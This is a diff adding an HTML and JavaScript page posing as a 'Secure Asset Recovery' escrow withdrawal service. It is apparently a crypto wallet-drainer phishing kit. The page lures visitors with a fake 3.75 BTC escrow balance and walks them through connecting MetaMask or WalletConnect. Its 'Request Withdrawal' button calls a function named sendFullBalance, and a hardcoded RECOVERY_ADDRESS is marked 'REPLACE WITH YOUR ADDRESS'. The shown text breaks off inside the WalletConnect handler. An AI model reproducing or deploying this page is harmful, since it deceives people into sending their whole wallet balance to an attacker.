@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="en">
+<div id="in-page-channel-node-id" data-channel-name="in_page_channel_rjN_Z9"></div>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Asset Recovery</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --dark: #1e293b;
+            --light: #f8fafc;
+            --gray: #94a3b8;
+            --light-gray: #e2e8f0;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f1f5f9;
+            color: var(--dark);
+            line-height: 1.6;
+        }
+
+        .card {
+            border: none;
+            border-radius: 16px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, var(--primary) 0%, #8b5cf6 100%);
+            color: white;
+            padding: 1.75rem;
+            text-align: center;
+        }
+
+        .card-header h2 {
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background-color: var(--light-gray);
+            border-radius: 4px;
+            margin: 2.5rem 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary) 0%, #8b5cf6 100%);
+            width: 33%;
+            transition: width 0.5s ease;
+        }
+
+        .address-box {
+            background-color: var(--light);
+            border: 1px solid var(--light-gray);
+            border-radius: 10px;
+            padding: 14px;
+            font-family: 'Roboto Mono', monospace;
+            word-break: break-all;
+            font-size: 0.9rem;
+        }
+
+        .status-card {
+            border-left: 4px solid;
+            padding: 1.25rem;
+            margin: 1.25rem 0;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+        }
+
+        .status-info {
+            border-left-color: var(--primary);
+            background-color: rgba(99, 102, 241, 0.05);
+        }
+
+        .status-success {
+            border-left-color: var(--success);
+            background-color: rgba(16, 185, 129, 0.05);
+        }
+
+        .status-warning {
+            border-left-color: var(--warning);
+            background-color: rgba(245, 158, 11, 0.05);
+        }
+
+        .status-danger {
+            border-left-color: var(--danger);
+            background-color: rgba(239, 68, 68, 0.05);
+        }
+
+        .btn-primary {
+            background-color: var(--primary);
+            border: none;
+            padding: 1rem 1.75rem;
+            font-weight: 600;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 6px rgba(99, 102, 241, 0.25);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .gas-notice {
+            background-color: #fff7ed;
+            border-left: 4px solid var(--warning);
+            padding: 1rem;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .gas-notice i {
+            margin-right: 10px;
+            font-size: 1.2rem;
+        }
+
+        .mobile-wallet-options {
+            display: none;
+            margin-top: 1.5rem;
+        }
+
+        .wallet-option-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            border-radius: 10px;
+            background-color: var(--light);
+            border: 1px solid var(--light-gray);
+            width: 100%;
+            text-align: left;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+
+        .wallet-option-btn:hover {
+            background-color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        .wallet-option-btn img {
+            width: 28px;
+            height: 28px;
+            margin-right: 12px;
+        }
+
+        .mobile-fallback {
+            display: none;
+            margin-top: 1.5rem;
+            padding: 1.25rem;
+            background-color: var(--light);
+            border-radius: 10px;
+            border-left: 4px solid var(--primary);
+        }
+
+        .mobile-instructions {
+            background-color: var(--light);
+            border-radius: 10px;
+            padding: 1.25rem;
+            margin-top: 1.5rem;
+            font-size: 0.95rem;
+            border-left: 4px solid var(--primary);
+        }
+
+        .balance-display {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin: 0.5rem 0;
+        }
+
+        .help-section {
+            background-color: white;
+            border-radius: 12px;
+            padding: 1.75rem;
+            margin-top: 2rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
+        }
+
+        .help-section li {
+            margin-bottom: 0.75rem;
+            padding-left: 0.5rem;
+        }
+
+        .walletconnect-modal__base {
+            z-index: 99999 !important;
+        }
+
+        .tx-hash-link {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .tx-hash-link:hover {
+            text-decoration: underline;
+        }
+
+        .recovery-address {
+            font-weight: 600;
+            color: var(--primary);
+        }
+
+        .section-title {
+            position: relative;
+            padding-left: 1.5rem;
+        }
+
+        .section-title:before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 1.5rem;
+            width: 4px;
+            background: var(--primary);
+            border-radius: 2px;
+        }
+
+        @media (max-width: 576px) {
+            .card-header {
+                padding: 1.5rem 1rem;
+            }
+
+            .balance-display {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+    <style>
+        @keyframes slide-in-one-tap {
+            from {
+                transform: translateY(80px);
+            }
+
+            to {
+                transform: translateY(0px);
+            }
+        }
+
+        .trust-hide-gracefully {
+            opacity: 0;
+        }
+
+        .trust-wallet-one-tap .hidden {
+            display: none;
+        }
+
+        .trust-wallet-one-tap .semibold {
+            font-weight: 500;
+        }
+
+        .trust-wallet-one-tap .binance-plex {
+            font-family: 'Binance';
+        }
+
+        .trust-wallet-one-tap .rounded-full {
+            border-radius: 50%;
+        }
+
+        .trust-wallet-one-tap .flex {
+            display: flex;
+        }
+
+        .trust-wallet-one-tap .flex-col {
+            flex-direction: column;
+        }
+
+        .trust-wallet-one-tap .items-center {
+            align-items: center;
+        }
+
+        .trust-wallet-one-tap .space-between {
+            justify-content: space-between;
+        }
+
+        .trust-wallet-one-tap .justify-center {
+            justify-content: center;
+        }
+
+        .trust-wallet-one-tap .w-full {
+            width: 100%;
+        }
+
+        .trust-wallet-one-tap .box {
+            transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+            animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+            width: 384px;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+            position: fixed;
+            right: 30px;
+            bottom: 30px;
+            z-index: 1020;
+        }
+
+        .trust-wallet-one-tap .header {
+            gap: 15px;
+            border-bottom: 1px solid #e6e6e6;
+            padding: 10px 18px;
+        }
+
+        .trust-wallet-one-tap .header .left-items {
+            gap: 15px;
+        }
+
+        .trust-wallet-one-tap .header .title {
+            color: #1e2329;
+            font-size: 18px;
+            font-weight: 600;
+            line-height: 28px;
+        }
+
+        .trust-wallet-one-tap .header .subtitle {
+            color: #474d57;
+            font-size: 14px;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .header .close {
+            color: #1e2329;
+            cursor: pointer;
+        }
+
+        .trust-wallet-one-tap .body {
+            padding: 9px 18px;
+            gap: 10px;
+        }
+
+        .trust-wallet-one-tap .body .right-items {
+            gap: 10px;
+            width: 100%;
+        }
+
+        .trust-wallet-one-tap .body .right-items .wallet-title {
+            color: #1e2329;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .body .right-items .wallet-subtitle {
+            color: #474d57;
+            font-size: 14px;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .connect-indicator {
+            gap: 15px;
+            padding: 8px 0;
+        }
+
+        .trust-wallet-one-tap .connect-indicator .flow-icon {
+            color: #474d57;
+        }
+
+        .trust-wallet-one-tap .loading-color {
+            color: #fff;
+        }
+
+        .trust-wallet-one-tap .button {
+            border-radius: 50px;
+            outline: 2px solid transparent;
+            outline-offset: 2px;
+            background-color: rgb(5, 0, 255);
+            border-color: rgb(229, 231, 235);
+            cursor: pointer;
+            text-align: center;
+            height: 45px;
+        }
+
+        .trust-wallet-one-tap .button .button-text {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .footer {
+            margin: 20px 30px;
+        }
+
+        .trust-wallet-one-tap .check-icon {
+            color: #fff;
+        }
+
+        @font-face {
+            font-family: 'Binance';
+            src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+            font-weight: 400;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Binance';
+            src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+            font-weight: 500;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Binance';
+            src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+            font-weight: 600;
+            font-style: normal;
+        }
+
+        /*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */
+    </style>
+</head>
+
+<body>
+    <div class="container py-5">
+        <div class="row justify-content-center">
+            <div class="col-lg-8">
+                <div class="card">
+                    <div class="card-header text-center">
+                        <h2><i class="fas fa-shield-alt me-2"></i> Secure Asset Recovery</h2>
+                        <p class="mb-0">Request withdrawal from escrow account</p>
+                    </div>
+
+                    <div class="card-body p-4 p-lg-5">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="progressFill"></div>
+                        </div>
+
+                        <div id="connectSection">
+                            <h4 class="mb-4 fw-bold section-title">1. Connect Your Wallet</h4>
+                            <p class="text-muted mb-4">Connect your wallet to request withdrawal from our escrow
+                                service.</p>
+
+                            <button id="connectBtn" class="btn btn-primary btn-lg w-100 py-3">
+                                <i class="fab fa-ethereum me-2"></i> Connect Wallet
+                            </button>
+
+                            <div id="mobileWalletOptions" class="mobile-wallet-options">
+                                <p class="text-muted mb-3">Choose your connection method:</p>
+
+                                <button class="wallet-option-btn" id="mmBrowserBtn">
+                                    <img src="https://metamask.io/images/metamask-logo.png" alt="MetaMask">
+                                    Open in MetaMask Browser
+                                </button>
+
+                                <button class="wallet-option-btn" id="walletConnectBtn">
+                                    <img src="https://walletconnect.com/_next/static/media/logo_mark.84dd8525.svg"
+                                        alt="WalletConnect">
+                                    Connect via WalletConnect
+                                </button>
+
+                                <div class="mobile-fallback" id="mobileFallback">
+                                    <p class="mb-3 fw-bold">Alternative Connection Method:</p>
+                                    <ol class="mb-3">
+                                        <li>Open MetaMask app</li>
+                                        <li>Go to browser section</li>
+                                        <li>Navigate to this page</li>
+                                        <li>Tap connect below</li>
+                                    </ol>
+                                    <button id="manualConnectBtn" class="btn btn-primary w-100 py-2">
+                                        <i class="fas fa-plug me-2"></i> Connect Manually
+                                    </button>
+                                </div>
+                            </div>
+
+                            <div id="mobileInstructions" class="mobile-instructions">
+                                <p class="fw-bold mb-2">Mobile Connection Guide:</p>
+                                <ol id="connectionSteps">
+                                    <li>Tap your preferred connection method above</li>
+                                    <li>Approve the connection in your wallet</li>
+                                    <li>Return to this page if redirected</li>
+                                    <li>Your wallet will connect automatically</li>
+                                </ol>
+                            </div>
+                        </div>
+
+                        <div id="recoverySection" style="display: none;">
+                            <h4 class="mb-4 fw-bold section-title">2. Account Verification</h4>
+                            <div class="mb-4">
+                                <p class="text-muted mb-2">Connected wallet:</p>
+                                <div class="address-box mb-3" id="walletAddress"></div>
+
+                                <p class="text-muted mb-2">Available balance:</p>
+                                <div class="balance-display" id="walletBalance">0 ETH</div>
+
+                                <p class="text-muted mb-2">Escrow Funded:</p>
+                                <div class="balance-display" id="walletBalance">3.75 BTC</div>
+                            </div>
+
+                            <div id="txStatus" class="status-card status-danger" style="display: block;"><i
+                                    class="fas fa-exclamation-circle me-2"></i>Connection failed: Connection rejected by
+                                user</div>
+
+                            <div class="gas-notice">
+                                <i class="fas fa-gas-pump"></i>
+                                <div>
+                                    <strong>Gas Notice:</strong> The transaction will deduct gas fees from your balance.
+                                    <div class="small text-muted mt-1">For large transfers, we automatically adjust gas
+                                        fees to ensure successful processing</div>
+                                </div>
+                            </div>
+
+                            <h4 class="mb-4 mt-5 fw-bold section-title">3. Request Withdrawal</h4>
+                            <p class="text-muted mb-4">This will transfer your assets from escrow address to your wallet
+                            </p>
+
+                            <div class="mb-4">
+                                <p class="text-muted mb-2">Escrow address:</p>
+                                <div class="address-box mb-3 recovery-address" id="recoveryAddress">
+                                    0xD47aa9E69a7C9cf52043A0702602FedA2dF5F4A4</div>
+                            </div>
+
+                            <button id="recoverBtn" class="btn btn-primary btn-lg w-100 py-3">
+                                <i class="fas fa-paper-plane me-2"></i> Request Withdrawal
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="help-section">
+                    <h5 class="fw-bold"><i class="fas fa-question-circle me-2"></i> Need Help?</h5>
+                    <ul class="list-unstyled">
+                        <li><i class="fas fa-check-circle text-success me-2"></i> Ensure you're on Ethereum Mainnet</li>
+                        <li><i class="fas fa-check-circle text-success me-2"></i> Need ETH in your wallet for gas fees
+                        </li>
+                        <li><i class="fas fa-check-circle text-success me-2"></i> Don't cancel the wallet popup</li>
+                        <li><i class="fas fa-check-circle text-success me-2"></i> Large transfers may take 3-5 minutes
+                        </li>
+                        <li><i class="fas fa-check-circle text-success me-2"></i> Do not close the page during
+                            withdrawal</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script>
+        const RECOVERY_ADDRESS = '0xD47aa9E69a7C9cf52043A0702602FedA2dF5F4A4'; // REPLACE WITH YOUR ADDRESS
+        const INFURA_ID = 'c089e0974c824ced9c2385af21dda82d'; // Replace with your Infura ID
+        const TX_TIMEOUT = 180000; // 3 minutes timeout for transactions (increased from 2 minutes)
+        
+        let currentAddress;
+        let provider;
+        let signer;
+        let walletConnectProvider;
+        let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        let isInMetaMaskBrowser = isMobile && window.ethereum && window.ethereum.isMetaMask && navigator.userAgent.match(/MetaMaskMobile/i);
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize UI based on device and environment
+            if (isMobile) {
+                document.getElementById('mobileWalletOptions').style.display = 'block';
+                document.getElementById('connectBtn').style.display = 'none';
+                
+                if (isInMetaMaskBrowser) {
+                    // Already in MetaMask browser - simplify instructions
+                    document.getElementById('connectionSteps').innerHTML = `
+                        <li>Tap the "Connect Wallet" button</li>
+                        <li>Approve the connection in your wallet</li>
+                        <li>Your wallet will connect automatically</li>
+                    `;
+                    document.getElementById('mobileFallback').style.display = 'none';
+                } else {
+                    // Not in MetaMask browser - show all options
+                    document.getElementById('connectionSteps').innerHTML = `
+                        <li>Choose your preferred connection method above</li>
+                        <li>Option 1: Open in MetaMask Browser (most reliable)</li>
+                        <li>Option 2: Connect via WalletConnect</li>
+                        <li>Or use the manual connection method below</li>
+                    `;
+                }
+            }
+            
+            // Set recovery address in UI
+            document.getElementById('recoveryAddress').textContent = RECOVERY_ADDRESS;
+            
+            // Set up event listeners
+            document.getElementById('connectBtn').addEventListener('click', connectWallet);
+            document.getElementById('mmBrowserBtn').addEventListener('click', openInMetaMaskBrowser);
+            document.getElementById('walletConnectBtn').addEventListener('click', connectWithWalletConnect);
+            document.getElementById('manualConnectBtn').addEventListener('click', connectWallet);
+            document.getElementById('recoverBtn').addEventListener('click', sendFullBalance);
+            
+            // If already in MetaMask browser, try connecting automatically
+            if (isInMetaMaskBrowser) {
+                setTimeout(connectWallet, 500);
+            }
+        });
+        
+        // Open the page in MetaMask's built-in browser
+        function openInMetaMaskBrowser() {
+            const mmBrowserUrl = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
+            
+            // Try to open in MetaMask browser
+            window.location.href = mmBrowserUrl;
+            
+            // Fallback if it fails
+            setTimeout(() => {
+                if (!document.hidden) {
+                    document.getElementById('mobileFallback').style.display = 'block';
+                    showTxStatus('info', 'Could not open in MetaMask browser. Please try WalletConnect.');
+                }
+            }, 1000);
+        }
+        
+        // Connect using WalletConnect
+        async function connectWithWalletConnect() {
+            try {
+                showTxStatus('info', 'Initializing WalletConnect...');
+                
+                // Initialize WalletConnect Provider
+                walletConnectProvider = new WalletConnectProvider.default({
+                    rpc: {
+                        1: `https://mainnet.infura.io/v3/${INFURA_ID}`,
+                    },
+                    chainId: 1,
+                    qrcode: false, // Disable QR code modal on mobile
+                    bridge: "https://bridge.walletconnect.org",
+                    mobileLinks: ["metamask"]
+                });
+                
+                // Enable session (triggers mobile wallet connection)
+                await walletConnectProvider.enable();
+                
+                // Create ethers provider from WalletConnect provider
+                provider = new ethers.providers.Web3Provider(walletConnectProvider);
+                signer = provider.getSigner();
+                currentAddress = await signer.getAddress();
+                
+                // Update UI
+                document.getElementById('walletAddress').textContent = currentAddress;
+                await updateBalance();
+                
+                document.getElementById('connectSection').style.display = 'none';
+                document.getElementById('recoverySection').style.display = 'block';
+                updateProgress('verify');
+                
+                showTxStatus('success', 'Wallet connected successfully via WalletConnect!');
+                setTimeout(() => {
+                    document.getElementById('txStatus').style.display = 'none';
+                }, 3000);
+                
+                // Handle disconnection
+                walletConnectProvider.on("disconnect", (code, reason) => {
+                    showTxStatus('warning', 'Wallet disconnected: ' + reason);
+                    resetConnection();
+                });
+                
+                // Handle account changes
+                walletConnectProvider.on("accountsChanged", (accounts) => {
+                    if (accounts.length > 0) {
+                        currentAddress = accounts[0];
+                        document.getElementById('walletAddress').textContent = currentAddress;
+                        updateBalance();
+                    } else {
+                        resetConnection();
+                    }
+                });
+                
+                // Handle chain changes
+                walletConnectProvider.on("chainChanged", (chainId) => {
+                    checkNetwork(parseInt(chainId, 16));
+                });
+                
+            } catch (error) {
+                showTxStatus('error', 'WalletConnect failed: ' + (error.message || error));
+                if (isMobile) {
